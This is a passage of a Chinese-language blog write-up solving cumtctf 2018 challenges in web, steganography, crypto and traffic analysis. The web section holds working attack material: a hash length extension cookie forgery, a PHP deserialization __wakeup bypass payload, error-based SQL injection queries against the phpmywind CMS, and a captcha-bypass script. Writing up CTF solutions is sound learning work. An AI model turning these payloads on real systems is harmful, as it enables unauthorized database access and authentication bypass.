class=\"line\">&#123;</span><br><span class=\"line\">        $s = $role;</span><br><span class=\"line\">        setcookie(<span class=\"string\">'role'</span>,$s);</span><br><span class=\"line\">        $hsh = md5($salt.$s);</span><br><span class=\"line\">        setcookie(<span class=\"string\">'hsh'</span>,$hsh);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($auth) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;h3&gt;Welcome Admin.Your flag is cumtctf&#123;you_know_this_is_not_the_flag&#125;\"</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>一看就是哈希长度扩展攻击</p>\n<p><a href=\"https://blog.csdn.net/syh_486_007/article/details/51228628\" target=\"_blank\" rel=\"noopener\">原理介绍</a><br><a href=\"https://www.cnblogs.com/pcat/p/5478509.html\" target=\"_blank\" rel=\"noopener\">工具介绍</a></p>\n<p>我们可以用hashpump工具来做</p>\n<p>由上面介绍的原理可以知道，在本题中，参与第一次md5哈希的可控字符串为guest，也就是说，本题中，我们已知的内容有$salt（代码加的盐，具体内容未知）的长度为13，$salt与guest拼接后的MD5哈希值c70ab9d039f166c5b5f506a5698ebaa1，那么基于此，我们可以构造哈希扩展攻击</p>\n<p><img src=\"/2018/12/07/cumtctf/4.png\" alt></p>\n<p>Input signature输入明文哈希，Input data输入第一次参与哈希的字符串的结尾的一部分，长度为$salt长度加上去掉inputdata之后字符串的长度，附加值随便，但是不能空，由于本题需要role中存在admin，所以我追加的是admin。比如本题中原来第一次参与hash的字符串为guest，我选择最后一个字符t作为inputdata，那么长度就为<code>len($salt)+len(&#39;gues&#39;)=17</code>，之后就会返回构造好的字符串和哈希值，把上面的<code>\\x</code>替换为<code>%</code>，之后修改cookie值，<code>role=&gt;guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin</code>，<code>hsh=&gt;37d0fe2c401a689be9608e9f850ef3de</code>，再刷新就可以得到flag了。</p>\n<!--cumtctf{Md5_1s_n0t_safe} -->\n<h2 id=\"淘金\"><a href=\"#淘金\" class=\"headerlink\" title=\"淘金\"></a>淘金</h2><p>这个题目的目标是抢金币达到1000即可通关，每次抢金币需要在三秒内输入验证码，成功即可抢到1金币，如果有毅力的话是可以手动抢的，或者写一个在线识别验证码的程序来自动抢也是可以的，但是这题还有更好的方案就是在我们提交验证码的环节，如果我们在请求中删去验证码字段即可成功抢到金币（也就是说验证码使可以绕过的），只是不确定这个是题目漏洞还是正解。代码如下，为了效率，同时抢多个人·</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\">url_post = <span class=\"string\">r'http://bxs.cumt.edu.cn/challenge/web/robber/dorob.php'</span></span><br><span class=\"line\">url_get = <span class=\"string\">r'http://bxs.cumt.edu.cn/challenge/web/robber/rob.php?id='</span></span><br><span class=\"line\">cookies=&#123;<span class=\"string\">\"PHPSESSID\"</span>:<span class=\"string\">\"2fle5nf7jrvi8lksme7uq0j1a3\"</span>,<span class=\"string\">\"ssid\"</span>:<span class=\"string\">\"a9598c3315159a39bbd981b8ec6fdb6d\"</span>&#125;   </span><br><span class=\"line\">s = requests.session()</span><br><span class=\"line\">names = [<span class=\"string\">\"bxsrc\"</span>,<span class=\"string\">\"333\"</span>,<span class=\"string\">\"08163266\"</span>,<span class=\"string\">\"EddieIvan\"</span>]</span><br><span class=\"line\">ids = [<span class=\"number\">144</span>,<span class=\"number\">125</span>,<span class=\"number\">142</span>,<span class=\"number\">109</span>]</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(names)):</span><br><span class=\"line\">        data = <span class=\"string\">\"user=\"</span>+str(ids[i])+<span class=\"string\">\"&amp;num=1\"</span></span><br><span class=\"line\">        req1 = s.get(url=url_get+str(ids[i]),cookies=cookies)</span><br><span class=\"line\">        print(url_get+str(ids[i]))</span><br><span class=\"line\">        req2 = s.post(url=url_post,cookies=cookies,data=data)</span><br><span class=\"line\">    time.sleep(<span class=\"number\">5</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"听说你会面向对象\"><a href=\"#听说你会面向对象\" class=\"headerlink\" title=\"听说你会面向对象\"></a>听说你会面向对象</h2><p>题目给出了源代码，核心代码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//flag in flag.php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Admin</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file = <span class=\"string\">'flag.php'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($f)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;file = $f;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __wakeup() method.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'flag'</span>)+<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">'dangerrous'</span>;</span><br><span class=\"line\">                <span class=\"keyword\">$this</span>-&gt;file = <span class=\"string\">'index.php'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        var_dump(<span class=\"keyword\">$this</span>-&gt;file);</span><br><span class=\"line\">        var_dump(file_exists(<span class=\"keyword\">$this</span>-&gt;file));</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __destruct() method.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!strpos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'/'</span>)&amp;&amp;!strpos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'\\\\'</span>))&#123;</span><br><span class=\"line\">            highlight_file(<span class=\"keyword\">$this</span>-&gt;file);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'你想干嘛'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>题目需要绕过需要__wakeup()函数，百度发现该处存在一个CVE漏洞 <a href=\"https://blog.csdn.net/qq_19876131/article/details/52890854\" target=\"_blank\" rel=\"noopener\">Click Here</a></p>\n<p>我们写php代码序列化</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Admin</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $file = <span class=\"string\">'flag.php'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$obj = <span class=\"keyword\">new</span> Admin();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> serialize($obj);</span><br></pre></td></tr></table></figure>\n<p>题目返回 <code>O:5:&quot;Admin&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code> ，我们只需要把Admin后面的1修改为2然后在url编码即可，最终payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">O%3A5%3A%22Admin%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure>\n<h2 id=\"phpmywind\"><a href=\"#phpmywind\" class=\"headerlink\" title=\"phpmywind\"></a>phpmywind</h2><p>首先得到flag非常简单，题目好像出bug了，访问首页直接就可以得到flag：）</p>\n<p><img src=\"/2018/12/07/cumtctf/7.png\" alt=\"payload\"></p>\n<p>但是题目好像修复了(事实上题目本身没有任何问题，之所以可看到flag是因为已经有大佬做出来了)，所以我们还是要来一波正解</p>\n<p>题目给出来cms和版本，直接百度搜索漏洞，发现有个前台sql注入漏洞，需要先注册一个合法用户，我注册了一个用户为test_snow，密码123456，登录，然后在该网址下提交如下内容(因为该题目没有回显，所以使用了报错注入)</p>\n<p><img src=\"/2018/12/07/cumtctf/11.png\" alt></p>\n<p>于是就可以看到数据库名，说明该报错方法可用，</p>\n<p><img src=\"/2018/12/07/cumtctf/12.png\" alt></p>\n<p>但是该语句无法使用select语句，网上查找到了另一种报错注入的方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select count(*),concat(char(@&#96;%27&#96;),(select schema_name from information_schema.schemata limit 1,1), 0x23,floor(rand(0)*2),char(@&#96;%27&#96;))x from information_schema.tables group by x</span><br></pre></td></tr></table></figure>\n<p>可以利用这种方法报库名，发现这个库名为 <code>phpmyflag</code> ，虽然不是当前库，但是flag应该就是在这个库中</p>\n<p>爆表名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select count(*),concat(char(@&#96;%27&#96;),(select table_name from information_schema.tables where table_schema&#x3D;0x7068706d79666c6167 limit 0,1), 0x23,floor(rand(0)*2),char(@&#96;%27&#96;))x from information_schema.tables group by x</span><br></pre></td></tr></table></figure>\n<p>本题中如果没有报错的话就会显示账号完善成功，这里只需要再次登录一下就可以了，由于题目转义过滤了单引号，所以使用了十六进制绕过</p>\n<p>爆列名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select count(*),concat(char(@&#96;%27&#96;),(select column_name from information_schema.columns where table_name&#x3D;0x666c6167 limit 0,1), 0x23,floor(rand(0)*2),char(@&#96;%27&#96;))x from information_schema.tables group by x</span><br></pre></td></tr></table></figure>\n<p>读flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select count(*),concat(char(@&#96;%27&#96;),(select flag from phpmyflag.flag limit 0,1), 0x23,floor(rand(0)*2),char(@&#96;%27&#96;))x from information_schema.tables group by x</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2018/12/07/cumtctf/14.png\" alt=\"result\"></p>\n<p>之前我以为flag在当前数据库中，走了不少弯路，看来还是自己思维太局限了</p>\n<p><a href=\"https://www.0dayhack.com/post-764.html\" target=\"_blank\" rel=\"noopener\">参考链接</a></p>\n<!--flag{327A6C4304AD5938EAF0EFB6CC3E53DC}-->\n<h1 id=\"BASIC\"><a href=\"#BASIC\" class=\"headerlink\" title=\"BASIC\"></a>BASIC</h1><h2 id=\"decode\"><a href=\"#decode\" class=\"headerlink\" title=\"decode\"></a>decode</h2><p>hex打开再base64解码即可</p>\n<h2 id=\"白驹过隙\"><a href=\"#白驹过隙\" class=\"headerlink\" title=\"白驹过隙\"></a>白驹过隙</h2><p>访问题目出现</p>\n<blockquote>\n<p>You Have Missed the Flag ~&gt;.&lt;~</p>\n</blockquote>\n<p>开始猜测可能是某次返回的正确的flag，于是一连访问了1000次还是一无所获，后面想到它说 “You <strong>Missed</strong> flag”，所以思路应该是发生了302跳转，抓包也没有发现什么异常，没找到时哪儿发生了302跳转，后面一个偶然的机会，我们在原来题目链接出查看一下链接</p>\n<p><img src=\"/2018/12/07/cumtctf/8.png\" alt></p>\n<p>再看题目页面的链接 <em>http://202.119.201.199/challenge/basic/http/defauIt.php </em> 仔细看一下，会发现两个 <code>default.php</code> 中题目给的链接中default倒数第二位是小写的L，而到了题目中变成了大写的 i ！！，如此的话跳转就清楚了，可以访问default.php(l为小写的L)</p>\n<p><img src=\"/2018/12/07/cumtctf/9.png\" alt></p>\n<p>可以看到确实发生了302跳转，抓包</p>\n<p><img src=\"/2018/12/07/cumtctf/10.png\" alt></p>\n<p>可以看到此处跳转到了defauIt.php(大写的i)，也可以看到我们读到了flag</p>\n<p>或者你也可以直接挑战页面点击题目链接抓包，也可以读到flag，原理是一样的</p>\n<!-- flag{U_a4e_A_Car3fu1_b0y} -->\n<h2 id=\"齐白石\"><a href=\"#齐白石\" class=\"headerlink\" title=\"齐白石\"></a>齐白石</h2><p>16进制编辑器查看一下即可在字符串末尾看到flag</p>\n<!-- flag{so_bor1ing_eMeMEMEMEM} -->\n<h2 id=\"encode\"><a href=\"#encode\" class=\"headerlink\" title=\"encode\"></a>encode</h2><p>题目给出的是jsfuck代码，直接找在线网站运行一下借口得到flag</p>\n<!-- flag{jj_3Nc0d3_i5_fun} -->\n<h2 id=\"DNS解析\"><a href=\"#DNS解析\" class=\"headerlink\" title=\"DNS解析\"></a>DNS解析</h2><p>直接修改本地hosts文件解开，linux下修改/etc/hosts文件，添加一行数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">202.119.201.199 welcome.bxsteam.xyz</span><br></pre></td></tr></table></figure>\n<p>然后访问welcome.bxsteam.xyz即可得到flag</p>\n<!-- flag{H3110_w0rld} -->\n<h2 id=\"签到1\"><a href=\"#签到1\" class=\"headerlink\" title=\"签到1\"></a>签到1</h2><p>邮件查看源代码，base64解码一下即可得到flag</p>\n<!-- flag{this_is_so_easy_is_it?} -->\n<h2 id=\"签到2\"><a href=\"#签到2\" class=\"headerlink\" title=\"签到2\"></a>签到2</h2><p>按照题目要去F12转到控制台在点击网络选项卡，选择重新载入，之后再消息头中的flag字段即可看到flag</p>\n<!-- flag{Linux-Centos} -->\n<h2 id=\"超简单的密码\"><a href=\"#超简单的密码\" class=\"headerlink\" title=\"超简单的密码\"></a>超简单的密码</h2><p>键盘加密，低头看下键盘即可，网上也有在线解密网站</p>\n<!-- flag{isee} -->\n<h2 id=\"滑稽\"><a href=\"#滑稽\" class=\"headerlink\" title=\"滑稽\"></a>滑稽</h2><p>ppt伪加密，打开后提示需要输入密码，网上找到一种方法可以绕过</p>\n<blockquote>\n<p>破解pptx只读需要密码<br>重命名qzxdh.pptx为qzxdh.zip，解压到<strong>当前文件夹</strong>后，切换到\\ppt之下，用记事本开启presentation.xml文件；<br>把<p:modifyVerifier ...>整块选中并删除，保存并关闭；<br>将文件再打包成qzxdh.zip，更名为pptx即可。<br>本文来自 qzxdh 的CSDN 博客 ，全文地址请点击：<a href=\"https://blog.csdn.net/qzxdh/article/details/72624298?utm_source=copy\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qzxdh/article/details/72624298?utm_source=copy</a> </p:modifyVerifier></p>\n</blockquote>\n<p>按照该方法即可打开PPT，之后拖动首页幻灯片后即可发现后面还藏着一张幻灯片，里面就有flag</p>\n<!-- flag{hua_tian_xia_zhi_da_ji} -->\n<h2 id=\"Fast-30\"><a href=\"#Fast-30\" class=\"headerlink\" title=\"Fast 30\"></a>Fast 30</h2><p>一道很常规的题目，就是不断把题目返回的信息在两秒之内发回去，这肯定不能人工操作，需要编程，本题需要提交的内容是header头里面的Flag字段的值，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://web.bxsteam.xyz/fast/\"</span></span><br><span class=\"line\">header = requests.get(url).headers[<span class=\"string\">\"Flag\"</span>]</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\theader = requests.post(url,data=&#123;<span class=\"string\">\"key\"</span>:header&#125;).headers[<span class=\"string\">'Flag'</span>]</span><br><span class=\"line\">\tans = requests.post(url,data=&#123;<span class=\"string\">\"key\"</span>:header&#125;).text</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">'&#123;'</span> <span class=\"keyword\">in</span> ans:</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<!-- cumtctf{time_1s_a_Resource} -->\n<h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><h2 id=\"LSB\"><a href=\"#LSB\" class=\"headerlink\" title=\"LSB\"></a>LSB</h2><p>题目给出了提示，lsb色道隐写，丢进steg里面看一下，发现rgb的每个0通道里面，图片上方都有会多出一个黑块，说明和这三个色道有关系</p>\n<p><img src=\"/2018/12/07/cumtctf/19.png\" alt></p>\n<p>提取一下这三个色道的信息，发现时png文件头</p>\n<p><img src=\"/2018/12/07/cumtctf/20.png\" alt></p>\n<p>提取保存为png图片是个二维码，直接扫码就可以看到flag</p>\n<!-- cumtctf{1sb_i4_s0_Ea4y} -->\n<h2 id=\"爱因斯坦\"><a href=\"#爱因斯坦\" class=\"headerlink\" title=\"爱因斯坦\"></a>爱因斯坦</h2><p>右键查看图片属性，发现在备注里面有一串字符 <code>this_is_not_password</code>，感觉这应该是压缩包密码，猜测图片中应该隐含了一个压缩包，hed软件打开图片，直接搜索 <code>504b0304</code> (zip文件头)，果然找到了，而且在右边的字符串中还看到了flag.txt字样，直接将这段提取出来，改后缀为zip，解压，提示需要密码，输入前面的字符串 <code>this_is_not_password</code> ，解压即可得到flag</p>\n<!-- flag{dd22a92bf2cceb6c0cd0d6b83ff51606} -->\n<h2 id=\"视而不见\"><a href=\"#视而不见\" class=\"headerlink\" title=\"视而不见\"></a>视而不见</h2><p>看了好久没思路，网上发现bmp图像的题目基本都是色道隐写的问题，于是就用stegsolve软件疯狂尝试，analyse-&gt;steteogram-&gt;solver里面修改偏移值找到了flag(233333)</p>\n<p><img src=\"/2018/12/07/cumtctf/21.png\" alt=\"result\"></p>\n<h2 id=\"鲨鱼的套路\"><a href=\"#鲨鱼的套路\" class=\"headerlink\" title=\"鲨鱼的套路\"></a>鲨鱼的套路</h2><p>打开数据包，追踪tcp流，发现如下内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hello</span><br><span class=\"line\">hehe</span><br><span class=\"line\">i will give you flag~</span><br><span class=\"line\">o</span><br><span class=\"line\">but you must tell me te.he anhhao...ao~</span><br><span class=\"line\">woyaohuinongcun</span><br><span class=\"line\">ok i will give you flag~</span><br><span class=\"line\">just revice .......g.receive it</span><br><span class=\"line\">UEsDBBQAAAgIANeFfErNFL6kGwAAABsAAAAcAAAAaGludF9zb21lIF90aGluZ19pc19mYWtlLnR4dEvLSUyvTs5IzUuPL87IjC9JzI&#x2F;PKQUyU&#x2F;NqAVBLAQI&#x2F;ABQACQAIANeFfErNFL6kGwAAABsAAAAcACQAAAAAAAAAIAAAAAAAAABoaW50X3NvbWUgX3RoaW5nX2lzX2Zha2UudHh0CgAgAAAAAAABABgAu7Ux1J+n0gGhDeAnl6fSAaEN4CeXp9IBUEsFBgAAAAABAAEAbgAAAFUAAAAAAA&#x3D;&#x3D;</span><br><span class=\"line\">~</span><br><span class=\"line\">bye~</span><br><span class=\"line\">o</span><br></pre></td></tr></table></figure>\n<p>这段应该是base64，但是在线网站无法解码，自己尝试，发现是个压缩包，保存为zip格式</p>\n<p><img src=\"/2018/12/07/cumtctf/22.png\" alt></p>\n<p>之后是zip伪加密</p>\n<p><img src=\"/2018/12/07/cumtctf/23.png\" alt></p>\n<!-- flag{cheng_shi_tao_lu_shen} -->\n<h2 id=\"easy-crypto\"><a href=\"#easy-crypto\" class=\"headerlink\" title=\"easy crypto\"></a>easy crypto</h2><p>解压之后有个morse.txt，一看就是摩斯密码，解码为 <code>keyisvigenerecipher</code> ，提到了维吉尼亚密码，直接解密flag.txt，key就是 <code>vigenerecipher</code> ，然后解码即可得到flag</p>\n<!-- flag{vigenereencryptionhhh} -->\n<h2 id=\"code\"><a href=\"#code\" class=\"headerlink\" title=\"code\"></a>code</h2><p>题目给出了代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">char getCode(char orgin) &#123;</span><br><span class=\"line\">    return ( key1 * (orgin-97) + key2 ) % 26 + 97;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">code : joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm</span><br></pre></td></tr></table></figure>\n<p>注意题目的路径其实给出了提示 <code>challenge/misc/fangshe/</code> ，最后的 <em>fangshe</em> 其实就是仿射的意思，意思是本题是一道放射密码的题目，就是位置为key1和key2的仿射加密，网上说了key1，key2的范围是小于26的，我们数论刚开始学，我也不是很理解，我个人感觉应该是由于题目的函数如果把key1和key2看做x和y的话，key1 * (orgin-97) + key2就是一条直线，那么key值大于26之后模26是会和前面重复的，这个以后学了得在研究一下，但是这题我们可尝试暴力破解，需要注意的是我之前以为题目给的code是密文，但事实上人家给的是明文，密文是flag …….</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">cipher = <span class=\"string\">\"joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm\"</span></span><br><span class=\"line\">ans = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> key1 <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">26</span>):</span><br><span class=\"line\">  <span class=\"keyword\">for</span> key2 <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">26</span>):</span><br><span class=\"line\">    ans = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> cipher:</span><br><span class=\"line\">      ans += chr((key1 * (ord(char)<span class=\"number\">-97</span>) + key2) % <span class=\"number\">26</span> + <span class=\"number\">97</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">\"flag\"</span> <span class=\"keyword\">in</span> ans <span class=\"keyword\">or</span> <span class=\"string\">\"ctf\"</span> <span class=\"keyword\">in</span> ans:</span><br><span class=\"line\">      print(ans)</span><br></pre></td></tr></table></figure>\n<p>跑完之后发现其中一个结果是</p>\n<blockquote>\n<p>heiboyflagisffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa</p>\n</blockquote>\n<p>断句一下为</p>\n<blockquote>\n<p>hei boy,flag is ffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa</p>\n</blockquote>\n<!-- flag{ffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa} -->\n<h2 id=\"PS-Master\"><a href=\"#PS-Master\" class=\"headerlink\" title=\"PS Master\"></a>PS Master</h2><p>题目提示的很明显了，和ps有关，那基本就是图层的问题了，但是题目的文件用PS无法打开，binwalk一下发现是个gif图片，修改文件后缀为gif，发现可以用PS打开，打开之后第二个图层是个二维码，但是无法扫描，因为定位块上都有个二哈</p>\n<p><img src=\"/2018/12/07/cumtctf/35.png\" alt=\"PS提取结果\"></p>\n<p>参照标准二维码可以知道，左上，右上，左下都应该是黑色的定位块，可以用win10自带的画图工具把右上的块复制到左上和左下，然后把二哈图案用黑色填充，处理之后如下，扫码可得flag</p>\n<p><img src=\"/2018/12/07/cumtctf/36.png\" alt=\"result\"></p>\n<!-- flag{hi_doge_i_am_er_ha} -->\n<h2 id=\"传感器1\"><a href=\"#传感器1\" class=\"headerlink\" title=\"传感器1\"></a>传感器1</h2><p>题目提示了是第九届全国大学生信息安全竞赛，可以知道这个题目考察的是曼彻斯特编码，先将题目的16进制转为2进制，根据曼彻斯特编码规则，由低到高即01代表1，由高到低即10代表0，之后转化为16进制之后发现与题目ID不符，还需要每八位进行一下反转，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Manchester</span><span class=\"params\">(s)</span>:</span></span><br><span class=\"line\">    ans = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(s)//<span class=\"number\">2</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> s[i*<span class=\"number\">2</span>:i*<span class=\"number\">2</span>+<span class=\"number\">2</span>] == <span class=\"string\">'01'</span>:</span><br><span class=\"line\">            ans += <span class=\"string\">'1'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> s[i*<span class=\"number\">2</span>:i*<span class=\"number\">2</span>+<span class=\"number\">2</span>] == <span class=\"string\">'10'</span>:</span><br><span class=\"line\">            ans += <span class=\"string\">'0'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"error in\"</span>,i)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans</span><br><span class=\"line\">s = <span class=\"string\">\"010101010101010101010101010101011001010101010101010110100110010101010101011010101010011010010110101010100110011001100110011001100110100101010101\"</span></span><br><span class=\"line\">p = Manchester(s)</span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(p)//<span class=\"number\">8</span>):</span><br><span class=\"line\">    flag += p[i*<span class=\"number\">8</span>:i*<span class=\"number\">8</span>+<span class=\"number\">8</span>][::<span class=\"number\">-1</span>]</span><br><span class=\"line\">print(hex(int(flag,<span class=\"number\">2</span>)))</span><br></pre></td></tr></table></figure>\n<!-- flag{FFFFFED31F645055F9} -->\n<h2 id=\"我就想试试这个名字到底能够起多长\"><a href=\"#我就想试试这个名字到底能够起多长\" class=\"headerlink\" title=\"我就想试试这个名字到底能够起多长\"></a>我就想试试这个名字到底能够起多长</h2><p>下载之后丢进stegsolve里面看一下，看一下低色道，发现是504b0304(zip文件头)</p>\n<p><img src=\"/2018/12/07/cumtctf/18.png\" alt=\"data extract\"></p>\n<p>保存为zip格式，但是解压不了，WinRAR修复一下就可以解压了，将解压后的文件拖进hex里面看一下直接就看到了flag。</p>\n<!-- hctf{dd0gf4c3tok3yb0ard4g41n~~~} -->\n<h2 id=\"你的石锅拌饭\"><a href=\"#你的石锅拌饭\" class=\"headerlink\" title=\"你的石锅拌饭\"></a>你的石锅拌饭</h2><p>题目给出了提示信息，<strong><em>培根</em></strong>，可知是培根加密，而且题目字体用了两种字体，就更加确定了，网上查资料发现培根密码有两种加密方式</p>\n<blockquote>\n<p> 第一种方式：<br>    A aaaaa B aaaab C aaaba D aaabb E aabaa<br>    F aabab G aabba H aabbb I abaaa J abaab<br>    K ababa L ababb M abbaa N abbab O abbba<br>    P abbbb Q baaaa R baaab S baaba T baabb<br>    U babaa V babab W babba X babbb Y bbaaa<br>    Z bbaab</p>\n<p>   第二种方式<br>    a AAAAA   g AABBA    n ABBAA   t BAABA<br>    b AAAAB   h AABBB    o ABBAB   u-v BAABB<br>    c AAABA   i-j ABAAA  p ABBBA   w BABAA<br>    d AAABB   k ABAAB    q ABBBB   x BABAB<br>    e AABAA   l ABABA    r BAAAA   y BABBA<br>    f AABAB   m ABABB    s BAAAB   z BABBB</p>\n</blockquote>\n<p>而本题目中说了要大写，所以使用的是第一种加密方式，把题目中正常字体写成A，斜体写成B，转换之后如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ABAAAABABBABBBABABABAABAABAABAAABBAAAAABAABAB</span><br></pre></td></tr></table></figure>\n<p>对照解密即可，也可以在在线网站解密</p>\n<h2 id=\"shark\"><a href=\"#shark\" class=\"headerlink\" title=\"shark\"></a>shark</h2><p>题目提示了用wireshark，是一道流量分析题目，打开之后随便浏览发现了ftp登录的信息</p>\n<p><img src=\"/2018/12/07/cumtctf/24.png\" alt=\"登录认证报文\"></p>\n<p>感觉题目应该是和ftp有关，过滤一下ftp协议</p>\n<p><img src=\"/2018/12/07/cumtctf/25.png\" alt></p>\n<p>这就基本确定了本题就是获取这个flag.zip，直接 <code>tcp contains &quot;flag&quot;</code> ，可以看到FTP-DATA协议中传输了flag.zip的数据</p>\n<p><img src=\"/2018/12/07/cumtctf/26.png\" alt></p>\n<p>追踪tcp流，然后可以看到文件头为504b0304，可以确定这就是我们要的flag.zip文件，但是不能直接保存，这样是打不开的，要按照原始数据保存</p>\n<p><img src=\"/2018/12/07/cumtctf/27.png\" alt=\"save as为flag.zip\"></p>\n<p>文件被加密了(不是伪加密)，需要密码，尝试前面登录ftp服务器的密码试一下，直接OK</p>\n<p>解压后的图片没有显示格式，丢进16进制编辑器里面看一下，是个png图片，但是文件头不对，修复一下</p>\n<p><img src=\"/2018/12/07/cumtctf/28.png\" alt></p>\n<p>然后保存为png图片打开就OK了</p>\n<p><img src=\"/2018/12/07/cumtctf/29.png\" alt=\"We are family!\"></p>\n<!-- flag{this_PIcTur3_1s_SO_ugly_} -->\n<h2 id=\"学姐真美\"><a href=\"#学姐真美\" class=\"headerlink\" 